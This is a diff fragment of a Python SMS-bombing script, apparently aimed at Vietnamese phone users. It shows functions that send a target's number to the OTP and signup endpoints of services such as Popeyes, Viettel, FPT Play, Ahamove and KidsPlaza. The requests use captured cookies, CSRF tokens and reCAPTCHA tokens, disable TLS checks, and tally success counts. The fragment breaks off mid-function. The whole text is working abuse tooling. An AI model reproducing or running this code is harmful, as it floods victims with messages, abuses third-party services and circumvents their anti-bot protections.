-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    }
-
-    json_data = {
-        'operationName': 'SendOTP',
-        'variables': {
-            'phone': phone,
+        json_data = {
+        'api_args': {
+            'lgUser': phone,
+            'type': 'phone',
         },
-        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
+        'api_method': 'CheckRegister',
     }
 
-    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=30, verify=False)
-    if 'INVALID' in response.text:
-        thatbai+=1
-    else:
-        thanhcong+=1
-
-
-#sms 42
-def sms19(phone):
-    global thanhcong
-    cookies = {
-        '_gcl_aw': 'GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE',
-        '_gcl_au': '1.1.2029065449.1703860145',
-        '_ga': 'GA1.1.1085625881.1703860163',
-        '_ga_GFJFDNFKH2': 'GS1.1.1703860162.1.0.1703860163.0.0.0',
-        '_fbp': 'fb.1.1703860165993.477455233',
-    }
-
-    headers = {
-        'authority': 'api.popeyes.vn',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json',
-        # 'cookie': '_gcl_aw=GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE; _gcl_au=1.1.2029065449.1703860145; _ga=GA1.1.1085625881.1703860163; _ga_GFJFDNFKH2=GS1.1.1703860162.1.0.1703860163.0.0.0; _fbp=fb.1.1703860165993.477455233',
-        'dnt': '1',
-        'origin': 'https://popeyes.vn',
-        'ppy': 'ULWQDN',
-        'referer': 'https://popeyes.vn/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-client': 'WebApp',
-    }
-
-    json_data = {
-        'phone': phone,
-        'firstName': 'tuoi',
-        'lastName': 'la',
-        'email': 'latuoi@gmail.com',
-        'password': 'cocailon',
-    }
-
-    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-    thanhcong+=1
-#sms 43
-def sms20(phone):
-    global thanhcong
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi-VN',
-        'BrandCode': 'ALFRESCOS',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'DNT': '1',
-        'DeviceCode': 'web',
-        'Origin': 'https://alfrescos.com.vn',
-        'Referer': 'https://alfrescos.com.vn/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    params = {
-        'culture': 'vi-VN',
-    }
-
-    json_data = {
-        'phoneNumber': phone,
-        'secureHash': '753d977024f8d805306e5078ad25a00a',
-        'deviceId': '',
-        'sendTime': 1703860383205,
-        'type': 1,
-    }
-
-    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data, timeout=30, verify=False)
-    thanhcong+=1
-
-#sms 44
-def sms21(phone):
-    global thanhcong
-    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
-    thanhcong+=1
-#sms 48
-def sms22(phone):
-    global thanhcong
-    headers = {
-        'authority': 'api.fptplay.net',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json; charset=UTF-8',
-        'dnt': '1',
-        'origin': 'https://fptplay.vn',
-        'referer': 'https://fptplay.vn/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-did': 'ABF6AD8B2ACE7D0E',
-    }
-
-    json_data = {
-        'phone': phone,
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
-    }
-
-    response = requests.post(
-        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=CUZ-KiJXaLMJ7FszwK_Zrw&e=1703864126&device=Chrome(version%253A120.0.0.0)&drm=1',
-        headers=headers,
-        json=json_data,
-    )
-    thanhcong+=1
-#sms49
-def sms23(phone):
-    global thanhcong
-    headers = {
-        'authority': 'api.ahamove.com',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json;charset=UTF-8',
-        'dnt': '1',
-        'origin': 'https://app.ahamove.com',
-        'referer': 'https://app.ahamove.com/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    }
-
-    json_data = {
-        'mobile': phone[1:9],
-        'name': 'hoang',
-        'email': 'bohoangdz@gmail.com',
-        'country_code': 'VN',
-        'firebase_sms_auth': 'true',
-        'time': 1703860692,
-        'checksum': 'H5orYHI463TcARZHf6xyU/lyv4+lx3w68FS1zNXx0Cx9gaj2npSXuh2aKSCVfR44cTSPPumj1ECww4Rlvn7hcEYP4RtrY8JZicv4ZPpWnxxyvS3NOuyPxOo64PatsAf8+dnEn09D0llQoq8FlD6tQfZ06bn9b5Ug1ZRakqndxdA4D4Y03bcXeraizM7P5EHkNzMebCIjOxANDSh8ODEqLBhmgKrkKSZT2Nl3ObWPQuhY0dO5xp7zW4zaBNbkD+JlvyewhsD9mN4pPxoambo2LfpXwDQthi04i/UKqEy+QtoM0bVkYypsUA1QiFvt+tKSSPf2C1qCJv5xJqUYehjiUg==',
-    }
-
-    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data, timeout=30, verify=False)
-    thanhcong+=1
-
-def sms24(phone):
-    global thanhcong
-    cookies = {
-        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
-        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
-        'redirectLogin': 'https://viettel.vn/dang-ky',
-        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
-    }
-
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json;charset=UTF-8',
-        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
-        'Origin': 'https://viettel.vn',
-        'Referer': 'https://viettel.vn/dang-ky',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
-        'X-Requested-With': 'XMLHttpRequest',
-        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
-        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    json_data = {
-        'msisdn': phone,
-    }
-
-    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-    thanhcong +=1
-#sms 55
-def sms25(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        'authority': 'www.kidsplaza.vn',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json',
-        'cookie': 'PHPSESSID=kinglbn5spravi3luvaatgs3jp; __Secure-API_SESSION=kinglbn5spravi3luvaatgs3jp; cdp_customerIdentify=1; _gcl_au=1.1.687785078.1703860922; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_aw=GCL.1703860929.CjwKCAiA-bmsBhAGEiwAoaQNmgcF7QjCtXC0oVUR6tR1trfoIm6IB2LRFOvYfhoUbSdCSUBBKJlssRoC6sEQAvD_BwE; _atm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNzAzODYwOTI5NzQzfQ%3D%3D; _pk_ref.564990546.fc16=%5B%22%22%2C%22%22%2C1703860930%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990546.fc16=*; form_key=HjN8YsX4Mj1p9W9E; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=HjN8YsX4Mj1p9W9E; _fbp=fb.1.1703860934946.540016440; _ga=GA1.1.1236270977.1703860935; _cdp_cfg=1; _cdp_fsid=3752649465283696; _asm_visitor_type=n; _ac_au_gt=1703860933843; _tt_enable_cookie=1; _ttp=IifvYCxKQHopLZQZnGf5XzcMpUz; _asm_uid=1380356661; store=hcm; private_content_version=updated-658edad32e5e12.60064562; X-Magento-Vary=e46423ae947909f49073dd3d5e74aa7e8975e2be; _asm_ss_view=%7B%22time%22%3A1703860935474%2C%22sid%22%3A%223752649465283696%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222023-12-29T14%3A42%3A46%22%2C%22duration%22%3A30994%7D; _ga_T93VCQ3ZQS=GS1.1.1703860935.1.1.1703860967.28.0.0; _pk_id.564990546.fc16=1380356661.1703860930.1.1703860983.1703860930.; _ac_client_id=1380356661.1703860983; _ac_an_session=zgzkzmzhzlznzqznzlzmzhzrzgzlzqzlzdzizgzrzjzgzmzlzlzlzizdzizkzjzgzrzlzjzqzrzgzdzizdzizkzjzgzrzlzjzqzrzgzdzizkzjzgzrzlzjzqzrzgzdzizdzhzlzdzhzd2f27zdzgzdzlzmzlzkzjzd; au_id=1380356661; section_data_ids=%7B%22customer%22%3A1703861934%2C%22cart%22%3A1703861970%2C%22shipping_address_selected%22%3A1703861972%2C%22messages%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22faq%22%3Anull%2C%22ammessages%22%3Anull%2C%22rewards%22%3Anull%2C%22ins%22%3Anull%2C%22custom_address_local_storage_data%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
-        'dnt': '1',
-        'origin': 'https://www.kidsplaza.vn',
-        'referer': 'https://www.kidsplaza.vn/',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    json_data = {
-        'data': {
-            'password': 'Qưert1234',
-            'confirm_password': 'Qưert1234',
-            'phone': phone,
-            'email': 'caobaquat@gmail.com',
-            'name': 'cao qua quat',
-            'website_id': '2',
-            'g_recaptcha_response': '03AFcWeA75cAjgxMNMOL5LbmcYAhxTdK2QLb3HgQ96S8MbpbVFLlCj5-U4AGBKZBg3PEyDyCw1gp1wmsGpeiEVKZ3wmLAkySQAhE_v-on0nHF1-ypoucOAVp9QS8X7J9EFxUuo2bQ1Iysa7OgVxzQ9jRz4JZ3SLHtjmjjl0UoYYrBFBamdaUvCZrRNw9HjuIyPQJrxXuCsL4Bw0FpqSaRAHrsF4aP4mMV7azfBII4n6foFEjbV5v9hyYtRkwj_vvwIBV2PpI9rtcI1zy2e0cnlONPVCO3pSIdBpnU6b1Q45RiCU8PZ5YHxQNzYQDNhdOW8SDKBV7PBjB_rk4puJ-EjuAa8xih2TfGpXkIxPV_B4MXshMiUYOGK6kAW1jtC06Ai49Sv2xAbyl_sJZ9kyPYCLmPUigyUhZfDTk6wzf1FTxbi9IwZ5Y69zkkIdI3E6cGK-QYPKl8NY9EQhgtKRSp-VcdGLIpanU1EmTeeuXn_q1EK-fxvN4rTJtGgwo4--UP2_kA2lk3Cygn3uFIZNnB_7YtlaeMvA-QQWJdjXM7R9frcK3KdxbIhkCKxw8xCMSYbc9wbIw-6vbUuUVoMM7vQNkmRb-Klu5tewPi9uOItwDiYmXQLBjW7ucTjvv63sZ_ZPYtAVmOc4iNMvJ3mi2k1XO7zYmZp7pNm2b47vzUIh-fmpOjDarghErGglilfy1U5grW_HV1scyhp5lWrSLhyQ9a_n3cxBCkqoRCeFv3rdco7KotOV1u1BfON_xHLeAGrbgpOybT62N0hjcFS8RElTEf8pddtQ-jz0EqfuP5N1kOi-6g4lY9bggZJ09bbJkdGXb1VmVLrlOAOTCgqW_0cAA7HqOXjpM3Nqtp9sp8IifvCpp_1nKHaACNyJca4Nla-ftROHVnHxLxq656pZws_7tEBBZzhkCuC_8x7Q_tJ_vfNLPDY13TY-Ep-jd9YM-hYxU-RnBidA8BJ4FvJjEVBLH9i7TKKO-quVZWIVRSY8o5xbymism17BCtpfZztjfC8q2_S2D5_EPWgkojMlfBkeeg3rlTnioP4NeGA1DE9cV-GP9_vpDcVGz1dg7wMbSKt59vw4yKnJX75fypBTAVgVrVyrvWRYF9fNBalVWQ6wu7ie_XpaCiOXVAys6UPl6lYsiJadvDJerYmRF58IJKSASUnunNZxN5zg-NGZvfu_ozzvRhrdlcvhc3Lm5xfN-uVT-GQfC0lg7yc30IOAMMVvjEGKA-XcJaGxq3Uw4ITikUSQRmr1u_PgoTV6qdxnYFaB9xV_sGMVT6z8P2SrSaUM4VWOL-SBZCbk7Mf2HOZYjxhglDwDJBt2DV2dgYNR-ApXpsNCjZwqnAzDGGH56XIX6Y7kk75C-C9aIHdErlX1ee3t6Pif8ZRcitngOrXMz_duyNPFKLVY78ZmBslhJJXJ_ywhh-P4tqxrDDlhYK1m_bwMwo4iWTYK2J92yTaX6c0cxg-TBYE0eAYZiscCvmxBf7egqpp6dMnFiS7f9JqFa8_lrG6gaFlaSrU9Q5hR77GbD9LO6eRLM68k1EE4APjUs9faxlhQ4z1rmB9b66HMab9Ug_dllDWSM9TUKTQOuJj4qoLmmD2bZAJ',
-        },
-    }
-
-    response = requests.post(
-        'https://www.kidsplaza.vn/rest/hcm/V1/customer/account/register/on-web',
-        headers=headers,
-        json=json_data,
-    )
-    thanhcong+=1
-#sms 56
-def sms26(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '_ga': 'GA1.1.1751329135.1703861100',
-        '_fbp': 'fb.1.1703861102777.176529727',
-        '_ga_5KHZV6MD4J': 'GS1.1.1703861100.1.0.1703861109.0.0.0',
-    }
-
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-        'Connection': 'keep-alive',
-        # 'Cookie': '_ga=GA1.1.1751329135.1703861100; _fbp=fb.1.1703861102777.176529727; _ga_5KHZV6MD4J=GS1.1.1703861100.1.0.1703861109.0.0.0',
-        'DNT': '1',
-        'Origin': 'https://id.icankid.vn',
-        'Referer': 'https://id.icankid.vn/auth',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'content-type': 'application/json',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    json_data = {
-        'phone': phone,
-        'challenge_code': '5b9005fe63325e396605b903a880358e7918d9f62c42dfb5c707116318164dfd',
-        'challenge_method': 'SHA256',
-        'recaptcha_response': '03AFcWeA4KZqSQejuSnmkm5NLHnv2jrAlew4hLmnOMiDH7mZ20TfbdLgvb_iFXbQm9i8qccALnN2RayQRVgWM_EJlfStQ4-r6SEBkVOkBHRMiJjNJsa4ghuX8I48UKvE9r1BiEJ3_BBgRuBKN_s-X7vFt231Gis2cK9lbjOzt0x2MHWcEAfP6ixjN3-5fPL9ogloWRillgHqIgRk2F761fzfwgOH0ymjm0umHxZaRULHoegWjdoB3vXllk1DYhYo-y4xSxn7tq_e9OwVC2xIGjLtO5vR94BioeIrsr368CkZItqFTFmGKqcI12Dkr558aeR1CWoCt6ihiDDR8eoN1o68A4TOFA_TVu0VrCmmME-MrE1QI5ItocnoJaxcO5RKFFsIu1QYqtpX-N3cHQuP6P9phnMNmyVY8H5H_xSiTnceAA0CUlsAn9eubQHIlUPY_ok_IXLmAZ-iFOVMVv3AvRErpnHHAoLsdLyGRhysIk7ZNtpMh57e5tlTHezJr7CPpO7rchUDdM2mEnBD-bJPyMNtNyxe3LieCMvG32okTXvGjLbA6wcLiCIzwT6c5RtHFMqvq_FYfSTvOiKQITguDNWw3xR9SQT2RcJwbZh4JehwoYmakYj190l8EJ-_PiiknxDi2LhSp1FhRCObX0js7Sl-vfaHVrXRgPOF38gc_RRRfLBnT8g7jszvM8DdKfwY10l5lxaBW18j1hSWwpnZDDRlyKhn_TOqusm2e-XQbE-a1V26Ft3_QJfzL4Y9Eo2PQgrW7LKuPYCot9lWiX6QexWV5GNL4rNWt6mXQMJFCgoAlfmyrQey5tbv44eeFZOzWOZWy2OLedVy5bLwMh5TqOFowZ3yTPIt0NWVb005ElpX5NGKyLjSRKUlXSiuNTWSW6bNYPyZr3FcVpA5ONSrc0F4Ctl7HydtGF2KmULQVI8UWp73IqVL8E5HJGuKToPzRkZjNRXlvRerXacSb2bLiXioMR6KG6rtNpoRbgPu1GjH8v79BRXNFb9SZu1ADx0Sy-u00_CjeYuRj5gp32PprtOcj8BuMKaHdd9K2cAh9aXOvleES73qk3UlOodXrJa6apbj6PFpUtYE5qE3NaAENYz1rp6-NQ89FHR7KJ3OSnLZqcASGp7ba0gt-nsNXyr7qR-Dieg2alljtOzSYfF0F3_c2UMSnMjWTu65pKyPzLmBDr0KFIGvbrqd_kcdfpDdQIL2-4uCkZ_9DDomACMTIYtq9kCVh_XWW8iPEkMuwCDHACBFA7VO5SPMYYb7uMoqj90lQ0fTFI364lvYzvHXKlaU97Zng-XOJRS-dGlSyu0ceDi5iZqd1BiivlIConTRvFPvDEVvEDK2IILpeS8zx9LFInmTainw8CmU65quBQkM7bir8UG7hvL4-Aa940kxuiTB1SbAkVl_4y0LPoMZ_DHMGNp9CS_jDNr5IatcFICb-g67g_U2J1uJC44SigbOjuMIQSMqZjTk1iIa4vzCKThBeb-3ncif1We_ASXy8xuTQUc_w_zpp-bzL2F-jYi86omdge49GNQbr28gM6Sq57sSjjH6GJ0YyVVygaWO8mi9gkhyYmriG_xZiHJRK3Eco-Z3SBNHewpWCp',
-    }
-
-    response = requests.post('https://id.icankid.vn/api/otp/challenge/', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-    thanhcong+=1
-#sms 58
-def sms27(phone):
-    global thanhcong
-    global thatbai
-    cookies = {
-        '_ym_uid': '1693617049750570465',
-        '_ym_d': '1693617049',
-        '_hjSessionUser_1750246': 'eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=',
-        'tts-utm-source': 'googlese',
-        'tts_analytics_guest_id': 'v6xJVO1mOf6mRnBcj9dMa',
-        'XSRF-TOKEN': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
-        'laravel_session': 'NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz',
-        '_gcl_au': '1.1.869912624.1703861253',
-        '_ga': 'GA1.1.1625249642.1703861258',
-        'NPS_81d9bd77_last_seen': '1703861258680',
-        '_hjSessionUser_1638305': 'eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=',
-        '_hjFirstSeen': '1',
-        '_hjIncludedInSessionSample_1638305': '0',
-        '_hjSession_1638305': 'eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==',
-        '_fbp': 'fb.1.1703861263674.583644751',
-        '_ga_W85LP5ZTQK': 'GS1.1.1703861258.1.1.1703861266.52.0.0',
-        '_ym_isad': '1',
-        '_ym_visorc': 'w',
-        'tts_notify_request': 'true',
-    }
-
-    headers = {
-        'authority': 'thitruongsi.com',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        'content-type': 'application/json',
-        # 'cookie': '_ym_uid=1693617049750570465; _ym_d=1693617049; _hjSessionUser_1750246=eyJpZCI6IjVhOGE0OGI2LTM5YTktNTY5ZC1hNTJmLTlhMjc0ZDFmMjE4MiIsImNyZWF0ZWQiOjE2OTM2MTcwNTA1OTYsImV4aXN0aW5nIjpmYWxzZX0=; tts-utm-source=googlese; tts_analytics_guest_id=v6xJVO1mOf6mRnBcj9dMa; XSRF-TOKEN=ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1; laravel_session=NPhgjHtQLS9zTjkcXagKiBHeH1NggSzio48tN1mz; _gcl_au=1.1.869912624.1703861253; _ga=GA1.1.1625249642.1703861258; NPS_81d9bd77_last_seen=1703861258680; _hjSessionUser_1638305=eyJpZCI6IjM1YzcxMzNiLTRkM2EtNWQ3MC1hMTVhLThlODA5NTFmOTQ0YSIsImNyZWF0ZWQiOjE3MDM4NjEyNjI1NzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_1638305=0; _hjSession_1638305=eyJpZCI6ImQ1ZWZhMjk5LTI2ZjMtNGU2My04MTJlLTRiNWI0Mzc4NmE0YyIsImMiOjE3MDM4NjEyNjI1ODQsInMiOjAsInIiOjAsInNiIjowfQ==; _fbp=fb.1.1703861263674.583644751; _ga_W85LP5ZTQK=GS1.1.1703861258.1.1.1703861266.52.0.0; _ym_isad=1; _ym_visorc=w; tts_notify_request=true',
-        'dnt': '1',
-        'origin': 'https://thitruongsi.com',
-        'referer': 'https://thitruongsi.com/user/register',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-        'x-xsrf-token': 'ogjtKPLiRqRYXapEbaRp479KQzXMMNTGEDVcaBG1',
-    }
-
-    json_data = {
-        'account_phone': phone,
-        'recaptcha_token': '03AFcWeA7v381xRFe3ivbZ6DLZhSCCy-7BXHn8peQLvLsMjhj0gqDLgsPXXn7aMZmjv60dFtXtKwev15IXaOG3Y_ZjsvojTeWHjmgFGw5GfvbMyXCAwTWQCYNLd3kbHpFMr4EyPb-97Nz4C4UF3tBfGm-W32Qq7AnTZdxKiy-W_hQ559telE03X6dcy6TKa7ucbDiXMzir5coCZewqj8pgzNP_4nwex-4WPfVTN_FPiX_ri89IJXis30eau37mXEdm-dcz3tS_lkCz5OZaDthG_zTDzxQhw4QhGGrMdawvC_A9Y8ltN1XoU1YsDjl864Jo2cuQ6JnVJ2GS4jkE17dkrPqBOlI1xYUu3CTv7eUypbccX3685-mAN_GYtZv5Loja3Yv1B7Pec8c6yasF2DiL_SoKB24tD6eTzfo2sWI4euVy2lJiWHlSO0H6K1MOSFMuyISzJevJqTKD_1Rsq351gU76F9mOJ6SVuF0HCRZddIlYgfCsZyOgGL88MZZZjNlArXN871ALM6eBsUwnPcxraflCmlZJ2wEa66EjRuAVH1HUp9EOtW4R4B-xQMFXAOEhLOlG1fpR8b6kF21UbzE00iwWhROOE8XUXA',
-    }
-
-    response = requests.post(
-        'https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    )
-    thanhcong+=1
-#sms 59
-def sms28(phone):
-    global thanhcong
-    global thatbai
-    link = 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + phone
-    response = requests.post(link, timeout=30, verify=False)
-    thanhcong+=1
-#sms 61
-def sms61(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        "Host": "api8.viettelpay.vn",
-        "product": "VIETTELPAY",
-        "accept-language": "vi",
-        "authority-party": "APP",
-        "channel": "APP",
